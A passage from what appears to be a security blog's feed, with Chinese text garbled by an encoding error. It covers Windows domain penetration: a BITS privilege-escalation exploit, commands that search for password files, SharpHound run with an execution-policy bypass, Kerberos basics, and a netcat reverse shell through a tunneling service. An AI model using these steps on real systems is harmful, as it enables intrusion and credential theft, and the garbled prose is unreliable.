è¾“æœåŠ¡ï¼ˆBITSï¼‰æ²¡æœ‰æ­£ç¡®å¤„ç†ç¬¦å·é“¾æ¥æ—¶ï¼Œå­˜åœ¨ç‰¹æƒæå‡æ¼æ´ï¼Œåˆ©ç”¨åæ”»å‡»è€…å¯ä»¥æ”¹å†™ç›®æ ‡æ–‡ä»¶æ¥æå‡æƒé™ï¼Œåˆ©ç”¨æ¡ä»¶å°±æ˜¯æ”»å‡»è€…éœ€è¦ç™»å½•ç³»ç»Ÿï¼Œå¯ä»¥è¿è¡ŒEXP</p><p>è¯¥æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼šWindows7 SP1-Windows10 1903æ‰€æœ‰æ¶æ„</p><p>åœ¨åˆ©ç”¨æ—¶æˆ‘ä»¬è¦å…ˆçœ‹ç›®æ ‡æœºå™¨æ˜¯å¦æœ‰å¯¹åº”æ¼æ´è¡¥ä¸</p><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr KB4540673<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202332882.png"></p><p>å¾ˆå¥½ï¼Œæ²¡æœ‰å¯¹åº”çš„è¡¥ä¸ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨å¯¹åº”çš„EXPï¼Œä¸Šä¼ åæ‰§è¡Œï¼ˆmlgbdä¸ºä»€ä¹ˆä¸å¼¹ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼‰</p><h3 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h3><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…ç½‘åŸŸæ¸—é€3</title>
      <link href="/posts/d114db98.html"/>
      <url>/posts/d114db98.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä½æƒé™æœé›†æœ¬æœºå¯†ç æ–‡ä»¶"><a href="#ä½æƒé™æœé›†æœ¬æœºå¯†ç æ–‡ä»¶" class="headerlink" title="ä½æƒé™æœé›†æœ¬æœºå¯†ç æ–‡ä»¶"></a>ä½æƒé™æœé›†æœ¬æœºå¯†ç æ–‡ä»¶</h1><ul><li><p><strong>dirå‘½ä»¤æœé›†å½“å‰æœºå™¨å„ç±»å¯†ç é…ç½®æ–‡ä»¶</strong></p><p>ä¸€èˆ¬é…ç½®æˆ–å¯†ç æ–‡ä»¶éƒ½æ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">pass.*,config.*,username.*,password.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥ç›´æ¥ä½¿ç”¨dirå‘½ä»¤è¿›è¡Œæœé›†ï¼Œå»ºè®®ä¸è¦ä»Cç›˜æ‰«ï¼Œä»userç›®å½•ä¸‹æ‰«æ</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">dir &#x2F;b &#x2F;s user.*,pass.*,config.*,username.*,password.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬cdåˆ°ç›®æ ‡ç›®å½•åç›´æ¥æ‰§è¡Œï¼Œå‘ç°å¯†ç æ–‡ä»¶ï¼š</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192105452.png"></p><p>æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192107139.png"></p></li><li><p><strong>forå¾ªç¯æœé›†å½“å‰æœºå™¨å„ç±»æ•æ„Ÿå¯†ç çš„é…ç½®æ–‡ä»¶</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">for &#x2F;r C:\ %i in (pass.*) do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªè€—æ—¶æ¯”è¾ƒä¹…ï¼Œæˆ‘ä»¬éœ€è¦ç¨ç­‰å†æŸ¥çœ‹ï¼Œæœ€ç»ˆç»“æœå’Œä¸Šé¢çš„dirå‘½ä»¤æ˜¯ç›¸ä¼¼çš„</p></li><li><p><strong>findstrå‘½ä»¤æŸ¥æ‰¾æ–‡ä»¶ä¸­çš„å­—æ®µ</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">findstr &#x2F;c:&quot;user&quot; &#x2F;c:&quot;pass&quot; &#x2F;si *.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192112055.png"></p></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…ç½‘åŸŸæ¸—é€2</title>
      <link href="/posts/a613eb0e.html"/>
      <url>/posts/a613eb0e.html</url>
      
        <content type="html"><![CDATA[<h1 id="BloodHoundä½¿ç”¨"><a href="#BloodHoundä½¿ç”¨" class="headerlink" title="BloodHoundä½¿ç”¨"></a>BloodHoundä½¿ç”¨</h1><p>å®‰è£…ç•¥è¿‡ï¼Œç™¾åº¦éƒ½æœ‰</p><p>é¦–å…ˆéœ€è¦å»å®˜æ–¹çš„Githubé¡¹ç›®ä¸­ä¸‹è½½æ”¶é›†å™¨ï¼Œæ³¨æ„è¿™ä¸ªç©æ„éœ€è¦.net 4.7ä»¥ä¸Šçš„è¿è¡Œç¯å¢ƒçš„ï¼Œä¸ç„¶ç›´æ¥å¼¹çª—ç»™ä½ çœ‹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#exeå‘½ä»¤</span>SharpHound<span class="token punctuation">.</span>exe <span class="token operator">-</span>c all<span class="token comment">#powershellå‘½ä»¤</span>powershell <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="å…³äºèº«ä»½è®¤è¯æ–¹å¼"><a href="#å…³äºèº«ä»½è®¤è¯æ–¹å¼" class="headerlink" title="å…³äºèº«ä»½è®¤è¯æ–¹å¼"></a>å…³äºèº«ä»½è®¤è¯æ–¹å¼</h3><h4 id="kerberosè®¤è¯"><a href="#kerberosè®¤è¯" class="headerlink" title="kerberosè®¤è¯"></a>kerberosè®¤è¯</h4><ul><li><p><strong>ç®€ä»‹</strong></p><p>Kerberosåè®®æ˜¯ä¸€ä¸ªä¸“æ³¨äºéªŒè¯é€šä¿¡åŒæ–¹èº«ä»½çš„ç½‘ç»œåè®®ï¼Œä¸åŒäºå…¶ä»–ç½‘ç»œå®‰å…¨åè®®çš„ä¿è¯æ•´ä¸ªé€šä¿¡è¿‡ç¨‹çš„ä¼ è¾“å®‰å…¨ï¼Œkerberosä¾§é‡äºé€šä¿¡å‰åŒæ–¹èº«ä»½çš„è®¤å®šå·¥ä½œï¼Œå¸®åŠ©å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è§£å†³â€œè¯æ˜æˆ‘è‡ªå·±æ˜¯æˆ‘è‡ªå·±â€çš„é—®é¢˜ï¼Œä»è€Œä½¿å¾—é€šä¿¡ä¸¤ç«¯èƒ½å¤Ÿå®Œå…¨ä¿¡ä»»å¯¹æ–¹èº«ä»½ï¼Œåœ¨ä¸€ä¸ªä¸å®‰å…¨çš„ç½‘ç»œä¸­å®Œæˆä¸€æ¬¡å®‰å…¨çš„èº«ä»½è®¤è¯ç»§è€Œè¿›è¡Œå®‰å…¨çš„é€šä¿¡ã€‚</p></li><li><p><strong>ç»„æˆè§’è‰²</strong></p><p><strong>å®¢æˆ·ç«¯ï¼ˆclientï¼‰</strong>ï¼šå‘é€è¯·æ±‚çš„ä¸€æ–¹</p><p><strong>æœåŠ¡ç«¯ï¼ˆServerï¼‰</strong>ï¼šæ¥æ”¶è¯·æ±‚çš„ä¸€æ–¹</p><p><strong>å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKey Distribution Centerï¼ŒKDCï¼‰</strong>ï¼Œè€Œå¯†é’¥åˆ†å‘ä¸­å¿ƒä¸€èˆ¬åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ï¼š </p><ul><li><strong>ASï¼ˆAuthentication Serverï¼‰</strong>ï¼šè®¤è¯æœåŠ¡å™¨ï¼Œä¸“é—¨ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯çš„èº«ä»½å¹¶å‘æ”¾å®¢æˆ·ç”¨äºè®¿é—®TGSçš„TGTï¼ˆç¥¨æ®æˆäºˆç¥¨æ®ï¼‰ </li><li><strong>TGSï¼ˆTicket Granting Ticketï¼‰</strong>ï¼šç¥¨æ®æˆäºˆæœåŠ¡å™¨ï¼Œç”¨æ¥å‘æ”¾æ•´ä¸ªè®¤è¯è¿‡ç¨‹ä»¥åŠå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯æ—¶æ‰€éœ€çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰</li></ul><p>åœ¨æ•´ä¸ªkerberosè®¤è¯è¿‡ç¨‹ä¸­ï¼Œä¸‰ä¸ªè§’è‰²ç¼ºä¸€ä¸å¯</p></li><li><p><strong>åŸç†</strong></p><p>ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ç†è§£ï¼Œæˆ‘ä»¬å…ˆå‡è®¾è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œç°åœ¨æœ‰ABCä¸‰äººï¼ŒAéœ€è¦å»æ‰¾Bå®Œæˆä¸€ä»¶äº‹æƒ…ï¼Œä½†æ˜¯å½¼æ­¤å¹¶æ²¡æœ‰è§è¿‡é¢ï¼ŒåªçŸ¥é“å¯¹æ–¹çš„åå­—ï¼Œé‚£å¦‚æœAç›´æ¥å»æ‰¾Bï¼ŒAå°±æ²¡æœ‰åŠæ³•å‘Bç›´æ¥è¯æ˜è‡ªå·±å°±æ˜¯Aï¼Œæ‰€ä»¥ç°åœ¨ä»–ä»¬æ‰¾åˆ°äº†å½¼æ­¤éƒ½è®¤è¯†å¹¶ä¸”ä¿¡ä»»çš„Cï¼Œè®©Cç»™Aä¸€ä¸ªå‡­è¯ï¼Œç”±Aäº¤ç»™Bå»æ‰¾Cæ¥éªŒè¯èº«ä»½ï¼Œè¿™æ—¶Aå°±èƒ½éªŒè¯è‡ªå·±çš„èº«ä»½äº†</p><p>ä¸Šé¢è¿™ä¸ªä¾‹å­å°±å¾ˆå¥½çš„è¯´æ˜äº†kerberosè®¤è¯çš„æ–¹å¼ï¼ŒAç›¸å½“äºå®¢æˆ·ç«¯ï¼ŒBç›¸å½“äºæœåŠ¡ç«¯ï¼ŒCç›¸å½“äºKDCï¼ŒKDCä¸­åŒ…å«ä¸€ä¸ªå«åšTGSï¼ˆç¥¨æ®æˆäºˆä¸­å¿ƒï¼‰çš„ç»„ä»¶ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç†è§£ä¸ºä»–å°±æ˜¯ä¸€ä¸ªå‘æ”¾èº«ä»½è®¤è¯ç¥¨æ®çš„æœåŠ¡ä¸­å¿ƒï¼Œåœ¨KDCè®¤è¯äº†ï¼ˆå…¶å®æ˜¯KDCä¸­çš„ASè®¤è¯çš„ï¼‰å®¢æˆ·ç«¯çš„èº«ä»½åï¼Œä»–ä¼šç»™å®¢æˆ·ç«¯å‘æ”¾ç”¨äºè®¿é—®ç½‘ç»œæœåŠ¡çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰ã€‚ç”±äºæ•´ä¸ªkerberosé€šä¿¡è¿‡ç¨‹éƒ½é‡‡ç”¨å¯¹ç§°åŠ å¯†çš„æ–¹å¼ï¼Œå¯†é’¥çš„è·å–ä¹Ÿæ˜¯ä»KDCä¸­å¾—åˆ°ï¼Œæ‰€ä»¥KDCå«åšå¯†é’¥åˆ†å‘ä¸­å¿ƒã€‚ </p></li><li><p><strong>æµç¨‹</strong></p><p>ä¸Šé¢çš„åŸç†ææ˜ç™½äº†ä¹Ÿå°±å¾ˆå®¹æ˜“çŸ¥é“æµç¨‹äº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜</p><p><strong>é—®é¢˜1</strong> KDCæ€ä¹ˆçŸ¥é“ä½ ï¼ˆå®¢æˆ·ç«¯ï¼‰å°±æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯ï¼Ÿå‡­ä»€ä¹ˆç»™ä½ å‘æ”¾æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰å‘¢ï¼Ÿ</p><p><strong>é—®é¢˜2</strong> æœåŠ¡ç«¯æ€ä¹ˆçŸ¥é“ä½ å¸¦æ¥çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰å°±æ˜¯ä¸€å¼ çœŸæ­£çš„ç¥¨æ®å‘¢ï¼Ÿ</p><p>æ‰€ä»¥è¯´ä¸Šé¢çš„åŸç†åªæ˜¯ä¸€ä¸ªç®€åŒ–åçš„æ¨¡å‹ï¼Œå®é™…ä¸Šçš„ä¸€æ¬¡å®Œæ•´çš„kerberosè®¤è¯æ€»å…±éœ€è¦ä¸‰æ¬¡é€šä¿¡</p><ol><li>å®¢æˆ·ç«¯é¦–å…ˆéœ€è¦æ¥åˆ°KDCè·å¾—æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰ã€‚ç”±äºå®¢æˆ·ç«¯æ˜¯ç¬¬ä¸€æ¬¡è®¿é—®KDCï¼Œæ­¤æ—¶KDCä¹Ÿä¸ç¡®å®šè¯¥å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œæ‰€ä»¥<strong>ç¬¬ä¸€æ¬¡é€šä¿¡çš„ç›®çš„ä¸ºKDCè®¤è¯å®¢æˆ·ç«¯èº«ä»½ï¼Œç¡®è®¤å®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªå¯é ä¸”æ‹¥æœ‰è®¿é—®KDCæƒé™çš„å®¢æˆ·ç«¯</strong></li><li>å®¢æˆ·ç«¯ä¼šç”¨è‡ªå·±çš„å¯†é’¥å°†ç¬¬äºŒéƒ¨åˆ†å†…å®¹è¿›è¡Œè§£å¯†ï¼Œåˆ†åˆ«è·å¾—æ—¶é—´æˆ³ï¼Œè‡ªå·±å°†è¦è®¿é—®çš„TGSçš„ä¿¡æ¯ï¼Œå’Œç”¨äºä¸TGSé€šä¿¡æ—¶çš„å¯†é’¥CT_SKã€‚é¦–å…ˆä»–ä¼šæ ¹æ®æ—¶é—´æˆ³åˆ¤æ–­è¯¥æ—¶é—´æˆ³ä¸è‡ªå·±å‘é€è¯·æ±‚æ—¶çš„æ—¶é—´ä¹‹é—´çš„å·®å€¼æ˜¯å¦å¤§äº5åˆ†é’Ÿï¼Œå¦‚æœå¤§äºäº”åˆ†é’Ÿåˆ™è®¤ä¸ºè¯¥ASæ˜¯ä¼ªé€ çš„ï¼Œè®¤è¯è‡³æ­¤å¤±è´¥ã€‚å¦‚æœæ—¶é—´æˆ³åˆç†ï¼Œå®¢æˆ·ç«¯ä¾¿å‡†å¤‡å‘TGSå‘èµ·è¯·æ±‚ï¼Œ</li><li>æ­¤æ—¶çš„å®¢æˆ·ç«¯æ”¶åˆ°äº†æ¥è‡ªKDCï¼ˆTGSï¼‰çš„å“åº”ï¼Œå¹¶ä½¿ç”¨ç¼“å­˜åœ¨æœ¬åœ°çš„CT_SKè§£å¯†äº†ç¬¬äºŒéƒ¨åˆ†å†…å®¹ï¼ˆç¬¬ä¸€éƒ¨åˆ†å†…å®¹ä¸­çš„STæ˜¯ç”±Serverå¯†ç åŠ å¯†çš„ï¼Œå®¢æˆ·ç«¯æ— æ³•è§£å¯†ï¼‰ï¼Œæ£€æŸ¥æ—¶é—´æˆ³æ— è¯¯åå–å‡ºå…¶ä¸­çš„CS_SKå‡†å¤‡å‘æœåŠ¡ç«¯å‘èµ·æœ€åçš„è¯·æ±‚ã€‚</li></ol><p>äº†è§£åˆ°è¿™äº›å†çœ‹è€åºçš„å›¾</p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113610118.png" alt="image-20221010113610118"></p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113606949.png" alt="image-20221010113606949"></p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/62638be70e3e745194dca594.png" alt="62638be70e3e745194dca594"></p></li></ul><h4 id="NTLMè®¤è¯"><a href="#NTLMè®¤è¯" class="headerlink" title="NTLMè®¤è¯"></a>NTLMè®¤è¯</h4><p>æœ¬åœ°å¯†ç å“ˆå¸Œï¼Œæ²¡äº†</p><h2 id="BloodHoundæ¿å—"><a href="#BloodHoundæ¿å—" class="headerlink" title="BloodHoundæ¿å—"></a>BloodHoundæ¿å—</h2><ol><li><p>Database Infoï¼ˆæ•°æ®åº“ä¿¡æ¯ï¼‰ï¼Œå¯æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„åŸŸç”¨æˆ·ï¼ŒåŸŸè®¡ç®—æœºç­‰ç»Ÿè®¡ä¿¡æ¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182041355.png"></p></li><li><p>Node Infoï¼ˆèŠ‚ç‚¹ä¿¡æ¯ï¼‰ï¼Œå•å‡»æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182045362.png"></p></li><li><p>Analysisï¼ˆåˆ†ææŸ¥è¯¢ï¼‰æä¾›äº†ä¸€äº›é¢„è®¾å¥½çš„æŸ¥è¯¢è¯­å¥</p></li></ol><ul><li><strong>Find all Domain Admins</strong>ï¼ˆæŸ¥è¯¢æ‰€æœ‰åŸŸç®¡ç†å‘˜ï¼‰</li><li><strong>Find Shortest Paths to Domain Admins</strong>ï¼ˆæ‰¾å‡ºåŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„ï¼‰</li></ul><p>éƒ¨åˆ†å†…å®¹å¼•ç”¨ä»¥ä¸‹æ–‡ç« ï¼š</p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">è¯¦è§£kerberosè®¤è¯åŸç†</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ— å…¬ç½‘æœåŠ¡å™¨åå¼¹shell</title>
      <link href="/posts/23df454a.html"/>
      <url>/posts/23df454a.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>ç”¨SakuraFrpï¼ˆå› ä¸ºå…è´¹ï¼‰ï¼Œ<a href="https://www.natfrp.com/user/">https://www.natfrp.com/user/</a></p></li><li><p>åœ¨<strong>ç©¿é€â€”éš§é“</strong>ä¸­å¼€å¯ä¸€ä¸ªæ–°çš„éš§é“ï¼Œæœ¬åœ°ç«¯å£å¯ä»»æ„è®¾å®šï¼Œæœ¬åœ°ç«¯å£å³ä¸ºç¨åç”µè„‘è¦ç›‘å¬çš„ç«¯å£</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171924171.png"></p></li><li><p>ä¸‹è½½SakuraFrpçš„å®˜æ–¹è½¯ä»¶ï¼Œè¿è¡Œï¼Œåœ¨ä¸ªäººä¸­å¿ƒä¸­æ‰¾åˆ°tokenå¹¶å¡«å…¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171948612.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171949150.png"></p><p>å¦‚å›¾æ‰€ç¤ºè¯´æ˜éš§é“å·²å¼€å¯</p></li><li><p>å¦èµ·ä¸€ä¸ªshellç«¯å£ï¼Œç›‘å¬ä¹‹å‰è®¾ç½®è¿‡çš„ç«¯å£</p><p><code>nc -lvp è®¾ç½®çš„ç«¯å£</code></p></li><li><p>ç”¨æ‰§è¡Œå‘½ä»¤åæç¤ºçš„IPæˆ–åŸŸåæ¥ç”Ÿæˆåå¼¹shellå‘½ä»¤</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952293.png"></p></li><li><p>æ‰§è¡ŒåæˆåŠŸå¼¹shell</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952765.png"></p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…ç½‘åŸŸæ¸—é€</title>
      <link href="/posts/a0d619b1.html"/>
      <url>/posts/a0d619b1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…ç½‘åŸŸæ¸—é€"><a href="#Windowså†…ç½‘åŸŸæ¸—é€" class="headerlink" title="Windowså†…ç½‘åŸŸæ¸—é€"></a>Windowså†…ç½‘åŸŸæ¸—é€</h1><h2 id="åŸŸæ£®æ—ä¸‹çš„å†…ç½‘ä¿¡æ¯æœé›†"><a href="#åŸŸæ£®æ—ä¸‹çš„å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="åŸŸæ£®æ—ä¸‹çš„å†…ç½‘ä¿¡æ¯æœé›†"></a>åŸŸæ£®æ—ä¸‹çš„å†…ç½‘ä¿¡æ¯æœé›†</h2><p>åœ¨æˆ‘ä»¬è¿›è¡Œæ¸—é€æµ‹è¯•è¿›å…¥å†…ç½‘åï¼Œé¢å¯¹çš„æ˜¯ä¸€ç‰‡é»‘æš—ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”å½“åšçš„å°±æ˜¯å¯¹å½“å‰æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒè¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œé€šå¸¸åˆ†ä¸ºä¸‰ç§åˆ¤æ–­</p><ul><li>æˆ‘æ˜¯è°â€”â€”â€”â€”å¯¹æœºå™¨è§’è‰²åˆ¤æ–­</li><li>è¿™æ˜¯å“ªâ€”â€”â€”â€”å¯¹ç›®å‰æœºå™¨æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒçš„æ‹“æ‰‘ç»“æ„è¿›è¡Œåˆ†æå’Œåˆ¤æ–­</li><li>æˆ‘åœ¨å“ªâ€”â€”â€”â€”å¯¹ç›®å‰æœºå™¨æ‰€å¤„çš„ä½ç½®åŒºåŸŸè¿›è¡Œåˆ¤æ–­</li></ul><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ç›®æ ‡å†…ç½‘è¿›è¡Œä¿¡æ¯æœé›†ï¼Œæœé›†çš„è¶Šå¤šå¯¹å†…ç½‘è¶Šäº†è§£æ‰èƒ½åœ¨æ¸—é€ä¸­å¦‚é±¼å¾—æ°´</p><p>é‚£å‡è®¾æˆ‘ä»¬ç°åœ¨å·²ç»è·å–åˆ°<strong>darkflow.com</strong>åŸŸä¸­çš„<strong>web-2021</strong>æœºå™¨çš„æ§åˆ¶æƒé™ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•ä½¿ç”¨CSæ¥è¿›è¡Œå†…ç½‘ä¿¡æ¯æœé›†</p><h3 id="æ˜¯å¦åœ¨åŸŸä¸­"><a href="#æ˜¯å¦åœ¨åŸŸä¸­" class="headerlink" title="æ˜¯å¦åœ¨åŸŸä¸­"></a>æ˜¯å¦åœ¨åŸŸä¸­</h3><p>åœ¨å¯¹Windowsè¿›è¡Œå†…ç½‘æ¸—é€çš„æ—¶å€™ï¼Œé’ˆå¯¹åŸŸç¯å¢ƒå’Œå·¥ä½œç»„ç¯å¢ƒæ‰€è¿›è¡Œçš„æ¸—é€æ–¹å¼æ˜¯å®Œå…¨ä¸åŒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“å…ˆåˆ¤æ–­ä¸»æœºäº‹éƒ½åœ¨åŸŸä¸­ï¼Œæ­¤å¤„æœ‰ä¸¤ç§æ–¹å¼</p><ol><li><p>ä½¿ç”¨<code>ipconfig /all</code>æŸ¥çœ‹å½“å‰ç½‘å¡å’ŒIPä¿¡æ¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122203724.png"></p><p>å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡Œä¹‹ååœ¨IPé…ç½®æ±‡æ€»å­˜åœ¨ä¸»DNSåç¼€ï¼Œè¿™ä»£è¡¨æˆ‘ä»¬å­˜åœ¨åœ¨åŸŸç¯å¢ƒä¸­ï¼Œåä¹‹åˆ™æ˜¯å·¥ä½œç»„ç¯å¢ƒ</p></li><li><p>ä½¿ç”¨<code>systeminfo</code>æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122205249.png"></p><p>æ­¤å¤„ä¸­åŸŸæ˜¾ç¤ºä¸ºä¸€ä¸ªåŸŸåï¼Œè€Œå¦‚æœæ˜¯å·¥ä½œç»„åˆ™ä¼šæ˜¾ç¤ºWORKGROUP</p></li><li><p>ä½¿ç”¨<code>net config workstation</code>æŸ¥çœ‹å½“å‰ç™»å½•åŸŸä»¥åŠç”¨æˆ·</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132335431.png"></p><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å·¥ä½œç«™åŸŸå¹¶ä¸”ä¸æ˜¯WORKGROUP</p></li><li><p>ä½¿ç”¨<code>net time /domain</code>æ¥æŸ¥çœ‹ç³»ç»Ÿæ—¶é—´ï¼Œå…¶ä¸­çš„<code>/domain</code>å‚æ•°ä»£è¡¨å…¶åªèƒ½åœ¨åŸŸç¯å¢ƒä¸­æ‰§è¡Œ</p><p>è¯¥å‘½ä»¤æ‰§è¡Œåæœ‰ä¸‰ç§æƒ…å†µ</p><ul><li>å­˜åœ¨åŸŸä½†å½“å‰ç”¨æˆ·å¹¶éåŸŸå†…ç”¨æˆ·ï¼š<code>å‘ç”Ÿç³»ç»Ÿé”™è¯¯ï¼Œæ‹’ç»è®¿é—®</code></li><li>å­˜åœ¨åŸŸå¹¶ä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸå†…ç”¨æˆ·ï¼šæ˜¾ç¤ºåŸŸä»¥åŠæ—¶é—´</li><li>ä¸å­˜åœ¨åŸŸï¼šæ‰¾ä¸åˆ°WORKGROUPçš„åŸŸæ§åˆ¶å™¨</li></ul></li></ol><h3 id="æœ¬æœºä¿¡æ¯æœé›†"><a href="#æœ¬æœºä¿¡æ¯æœé›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æœé›†"></a>æœ¬æœºä¿¡æ¯æœé›†</h3><p>åœ¨åˆ†è¾¨å¥½æˆ‘ä»¬æ˜¯åœ¨åŸŸä¸­è¿˜æ˜¯å·¥ä½œç»„åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å½“å‰æœºå™¨è¿›è¡Œä¿¡æ¯æœé›†äº†</p><ul><li><p><strong>è·å–æœ¬æœºç½‘ç»œé…ç½®ä¿¡æ¯</strong>ï¼š<code>ipconfig /all</code></p><p><img 